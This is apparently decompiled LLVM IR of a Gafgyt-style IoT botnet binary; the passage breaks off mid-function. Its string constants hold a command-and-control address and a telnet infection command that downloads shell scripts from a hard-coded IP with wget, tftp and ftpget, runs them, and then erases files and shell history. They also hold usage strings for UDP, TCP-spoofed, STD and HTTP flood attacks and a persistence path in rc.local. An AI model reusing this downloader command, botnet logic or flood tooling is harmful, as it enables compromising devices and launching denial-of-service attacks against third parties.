source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80596b4.2 = global i32 0
@global_var_80596e4.3 = local_unnamed_addr global i32* @global_var_80596b4.2
@global_var_80586a4.4 = constant i32 0
@global_var_805a064.5 = global i32 0
@global_var_80596b8.6 = local_unnamed_addr global i32 0
@global_var_805a0a0.7 = global i32 0
@global_var_805a0a4.8 = local_unnamed_addr global i32 0
@global_var_805a0a8.9 = local_unnamed_addr global i32 0
@global_var_8059dd0.10 = local_unnamed_addr global i32 4095
@global_var_8059dcc.11 = local_unnamed_addr global i32 362436
@global_var_80562fd.12 = constant [7 x i8] c"(null)\00"
@global_var_8056304.14 = constant [3 x i8] c"-c\00"
@global_var_8056307.15 = constant [3 x i8] c"sh\00"
@global_var_805630a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8056320.17 = constant i32 -1
@global_var_805a080.18 = local_unnamed_addr global i32 0
@global_var_8056720.19 = constant [5 x i8] c"PING\00"
@global_var_80562f1.20 = constant [8 x i8] c"busybox\00"
@global_var_80562f9.21 = constant i32 2293796
@global_var_80562fb.22 = constant i32 1848115235
@global_var_8059d80.23 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80562f1.20, i32 0, i32 0), i8* bitcast (i32* @global_var_80562f9.21 to i8*), i8* bitcast (i32* @global_var_80562fb.22 to i8*)]
@global_var_80562c5.24 = constant [7 x i8] c"nvalid\00"
@global_var_80562cc.25 = constant [6 x i8] c"ailed\00"
@global_var_80562d2.26 = constant [9 x i8] c"ncorrect\00"
@global_var_80562db.27 = constant [6 x i8] c"enied\00"
@global_var_80562e1.28 = constant [5 x i8] c"rror\00"
@global_var_80562e6.29 = constant [7 x i8] c"oodbye\00"
@global_var_80562ed.30 = constant [4 x i8] c"bad\00"
@global_var_8059d60.31 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562c5.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562cc.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80562d2.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562db.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80562e1.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562e6.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80562ed.30, i32 0, i32 0)]
@global_var_805a088.32 = local_unnamed_addr global i32 0
@global_var_805a08c.33 = local_unnamed_addr global i32 0
@global_var_8060314.34 = local_unnamed_addr global i32 0
@global_var_8056725.35 = constant [6 x i8] c":>%$#\00"
@global_var_805672c.40 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8060308.41 = local_unnamed_addr global i32 0
@global_var_8056260.42 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805626f.43 = constant [6 x i8] c"/tmp/\00"
@global_var_8056275.44 = constant [6 x i8] c"/var/\00"
@global_var_805627b.45 = constant [6 x i8] c"/dev/\00"
@global_var_8056281.46 = constant [10 x i8] c"/var/run/\00"
@global_var_805628b.47 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8056295.48 = constant [6 x i8] c"/mnt/\00"
@global_var_805629b.49 = constant [7 x i8] c"/boot/\00"
@global_var_80562a2.50 = constant [6 x i8] c"/usr/\00"
@global_var_80562a8.51 = constant [6 x i8] c"/opt/\00"
@global_var_8059d20.52 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8056260.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805626f.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056275.44, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805627b.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8056281.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805628b.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056295.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805629b.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562a2.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562a8.51, i32 0, i32 0)]
@global_var_8059d4c = external global i32
@global_var_8056738.57 = constant [3 x i8] c"\0D\0A\00"
@global_var_8059da0.58 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562c5.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562cc.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80562d2.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80562db.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80562e1.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562e6.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80562ed.30, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80562f1.20, i32 0, i32 0), i8* bitcast (i32* @global_var_80562f9.21 to i8*), i8* bitcast (i32* @global_var_80562fb.22 to i8*)]
@global_var_805673c.59 = constant i32 993090331
@global_var_8056799.60 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_805679e.61 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8055710.62 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_8059794.63 = local_unnamed_addr global [443 x i8]* @global_var_8055710.62
@global_var_80567c8.64 = constant [6 x i8] c"arfgG\00"
@global_var_80567ce.65 = constant [9 x i8] c"HBiug655\00"
@global_var_80567d7.66 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_80567e4.67 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_80567f8.68 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8056809.69 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8056815.70 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8056821.71 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805682d.72 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8056837.73 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8056842.74 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8056850.75 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805685c.76 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8056869.77 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8056872.78 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8056882.79 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805688d.80 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8056899.81 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_80568a5.82 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_80568b3.83 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_80568c1.84 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_80568cf.85 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_80568d9.86 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_80568e7.87 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_80568f5.88 = constant [12 x i8] c"yteytietyue\00"
@global_var_8056901.89 = constant [9 x i8] c"qsortEQS\00"
@global_var_805690a.90 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805691a.91 = constant [4 x i8] c"std\00"
@global_var_805691e.92 = constant [4 x i8] c"dts\00"
@global_var_8056922.93 = constant [4 x i8] c"lsk\00"
@global_var_8056926.94 = constant [4 x i8] c"kek\00"
@global_var_805692a.95 = constant [6 x i8] c"smack\00"
@global_var_8056930.96 = constant [4 x i8] c"ily\00"
@global_var_8056934.97 = constant [4 x i8] c"tyf\00"
@global_var_8056938.98 = constant [4 x i8] c"pos\00"
@global_var_805693c.99 = constant [6 x i8] c"cunts\00"
@global_var_8056960.100 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80567c8.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80567ce.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80567d7.66, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_80567e4.67, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80567f8.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056809.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056815.70, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056821.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805682d.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056837.73, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056842.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056850.75, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805685c.76, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056869.77, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8056872.78, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056882.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805688d.80, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056899.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568a5.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568b3.83, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568c1.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80568cf.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568d9.86, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80568e7.87, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80568f5.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056901.89, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805690a.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805691a.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805691e.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056922.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056926.94, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805692a.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056930.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056934.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056938.98, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805693c.99, i32 0, i32 0)]
@global_var_80569f0.101 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_8056a30.102 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_8056a4c.103 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_8056a6d.104 = constant [4 x i8] c"all\00"
@global_var_8056a71.105 = constant i32 2037579820
@global_var_8056a73.106 = constant [4 x i8] c"syn\00"
@global_var_8056a77.107 = constant [4 x i8] c"rst\00"
@global_var_8056a7b.108 = constant [4 x i8] c"fin\00"
@global_var_8056a7f.109 = constant [4 x i8] c"ack\00"
@global_var_8056a83.110 = constant [4 x i8] c"psh\00"
@global_var_8056a87.111 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8056a99.112 = constant [6 x i8] c"PONG!\00"
@global_var_8056a9f.113 = constant [6 x i8] c"PUSSY\00"
@global_var_8056aa5.114 = constant [4 x i8] c"OFF\00"
@global_var_8060310.115 = local_unnamed_addr global i32 0
@global_var_8056aa9.116 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_8056ab7.117 = constant [3 x i8] c"ON\00"
@global_var_8056aba.118 = constant [5 x i8] c"HTTP\00"
@global_var_8056ac0.119 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_8056ae6.120 = constant [4 x i8] c"UDP\00"
@global_var_8056aec.121 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_8056b5d.122 = constant [4 x i8] c"TCP\00"
@global_var_8056b64.123 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_8056c1e.124 = constant [4 x i8] c"STD\00"
@global_var_8056c22.125 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_8056c3d.126 = constant [5 x i8] c"STOP\00"
@global_var_8059d18.127 = local_unnamed_addr global i32 -1
@global_var_80556fb.128 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_8059790.129 = global [20 x i8]* @global_var_80556fb.128
@global_var_8056c42.130 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8056c4a.131 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8056c5a.132 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8056c65.134 = constant [7 x i8] c"x86_32\00"
@global_var_8056c6c.135 = constant i32 1952788224
@global_var_8056c6d.136 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_8056c82.138 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8056c91.140 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8056c99.141 = constant i32 1868955745
@global_var_8056c9b.142 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8056ca8.143 = constant i32 993090331
@global_var_8056d0f.144 = constant [5 x i8] c"PONG\00"
@global_var_8056d14.145 = constant [9 x i8] c"LELIMDUP\00"
@global_var_8056d1d.146 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8056d31.147 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_8056d3c.148 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8056d44.149 = constant [3 x i8] c"%s\00"
@global_var_8056d47.150 = constant i32 32
@global_var_80602d0.151 = local_unnamed_addr global i32 0
@global_var_8059dd8 = external local_unnamed_addr global i32
@global_var_80602e0.157 = global i32 0
@global_var_8059e14.158 = global i32 0
@global_var_805e0a4.159 = local_unnamed_addr global i32 0
@global_var_805e0a8.160 = local_unnamed_addr global i32 0
@global_var_8059e2c.161 = local_unnamed_addr global i32 2
@global_var_8059dfc.162 = global i32 0
@global_var_8059df8.163 = global i32* bitcast (i16* @global_var_8059e40.154 to i32*)
@global_var_8057360.164 = constant i32 0
@global_var_8057378.165 = constant [6 x i8] c"(nil)\00"
@global_var_805737e.166 = constant [7 x i8] c"(null)\00"
@global_var_8057385.167 = constant i32 2949163
@global_var_80573f2.169 = constant i32 327688
@global_var_80573ea.170 = constant [8 x i8] c" +0-#'I\00"
@global_var_8057398.171 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80573d5.172 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80573cb.173 = constant i32 117506048
@global_var_80573bc.174 = constant i32 331776
@global_var_8057440.175 = constant [8 x i8] c"Success\00"
@global_var_8057416.176 = constant [15 x i8] c"Unknown error \00"
@global_var_8058340.177 = constant i32 65536
@global_var_805a040.178 = local_unnamed_addr global i32* @global_var_8058340.177
@global_var_80600c0.179 = global i32 0
@global_var_80600c4.180 = global i32 0
@global_var_80600e0.181 = global i32 0
@global_var_80602ac.182 = global i32 0
@global_var_805a048.183 = global i32 0
@global_var_8060734.184 = local_unnamed_addr global i32 0
@global_var_8060728.185 = global i32 0
@global_var_8060320.186 = global i32 0
@global_var_8059f30.187 = global i32 0
@global_var_80603cc.189 = global i32 0
@global_var_80603d0.190 = local_unnamed_addr global i32 0
@global_var_80603d4.191 = global i32 0
@global_var_80603e0.192 = local_unnamed_addr global i32 0
@global_var_80606d4.193 = global i32 0
@global_var_80606fc.194 = local_unnamed_addr global i32 0
@global_var_80606ec.195 = local_unnamed_addr global i32 0
@global_var_80606f0.196 = local_unnamed_addr global i32 0
@global_var_80606f4.197 = local_unnamed_addr global i32 0
@global_var_8060710.198 = local_unnamed_addr global i32 0
@global_var_80606f8.199 = local_unnamed_addr global i32 0
@global_var_8060704.200 = local_unnamed_addr global i32 0
@global_var_8060708.201 = local_unnamed_addr global i32 0
@global_var_8060714.202 = local_unnamed_addr global i32 0
@global_var_80606e8.203 = local_unnamed_addr global i32 0
@global_var_80606e4.205 = local_unnamed_addr global i32 0
@global_var_806070c.206 = local_unnamed_addr global i32 0
@global_var_80603dc.207 = local_unnamed_addr global i32 0
@global_var_8059f48.208 = global i32 0
@global_var_8059f60.210 = global i32 0
@global_var_8059f78 = external global i32
@global_var_8059fa4.212 = global i32 -1726662223
@global_var_8059f80.213 = local_unnamed_addr global i32* @global_var_8059fa4.212
@global_var_8059f7c.214 = global i32* @global_var_8059fa4.212
@global_var_8057fb4.215 = constant i32 0
@global_var_8057fa0.216 = constant i32 0
@global_var_805a020.217 = global i32 0
@global_var_80602c4.218 = local_unnamed_addr global i32 0
@global_var_80602cc.219 = local_unnamed_addr global i32 0
@global_var_80596a8.221 = global i32 -1
@global_var_8051afb.222 = constant i32 -294069
@global_var_80602d4.223 = local_unnamed_addr global i32 0
@global_var_80602d8.224 = local_unnamed_addr global i32 0
@global_var_8058220.225 = constant [10 x i8] c"/dev/null\00"
@global_var_80602c8.227 = local_unnamed_addr global i32 0
@global_var_8051d07.230 = constant i32 1928542531
@global_var_8060304.231 = local_unnamed_addr global i32 0
@global_var_80602e4.232 = global i32 0
@global_var_8058550.234 = constant [4 x i8] c"inf\00"
@global_var_8058553.239 = constant i32 1179535616
@global_var_8058560.240 = constant i32 2883630
@global_var_8060738.244 = local_unnamed_addr global i32 0
@global_var_805861c.245 = constant i32 1697579054
@global_var_8058650.246 = constant i32 1868824690
@global_var_805861e.247 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805862f.248 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8058647.249 = constant [11 x i8] c"nameserver\00"
@global_var_8058652.250 = constant [7 x i8] c"domain\00"
@global_var_8058659.251 = constant [7 x i8] c"search\00"
@global_var_8060718.252 = global i32 0
@global_var_806073c.253 = local_unnamed_addr global i32 0
@global_var_8060740.254 = local_unnamed_addr global i32 0
@global_var_8058674.255 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8058671.257 = constant [3 x i8] c"%x\00"
@global_var_8058685.258 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8058690.259 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805a060.1 = local_unnamed_addr global i8 0
@global_var_805e0a0.13 = external local_unnamed_addr global i8*
@global_var_805a09b.36 = local_unnamed_addr global i8 0
@global_var_805a09c.37 = local_unnamed_addr global i8 0
@global_var_805a09d.38 = local_unnamed_addr global i8 0
@global_var_805a09e.39 = local_unnamed_addr global i8 0
@global_var_805a090.133 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_8056c8f.139 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8059e40.154 = global i16 288
@global_var_8059e90.155 = local_unnamed_addr global i16 272
@global_var_805740a.168 = external constant i8*
@global_var_80603a0.188 = global i8 0
@global_var_8060700.204 = local_unnamed_addr global i8 0
@global_var_80602c0.209 = local_unnamed_addr global i8 0
@global_var_80602dc.226 = local_unnamed_addr global i8 0
@global_var_8058580.237 = constant x86_fp80* null
@global_var_80602e8.241 = external global i8*
@global_var_8060300.242 = local_unnamed_addr global i64 0
@global_var_805a044.243 = local_unnamed_addr global i16 1
@global_var_8056c80.137 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 71199
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805a060.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80596e4.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80596e4.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80596e4.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805a060.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80596e4.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805a060.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_80586a4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_80596b8.6, align 8
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134533409, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134564356, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805a0a0.7, align 32
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_805a0a4.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_805a0a8.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_805a0a0.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_805a0a0.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
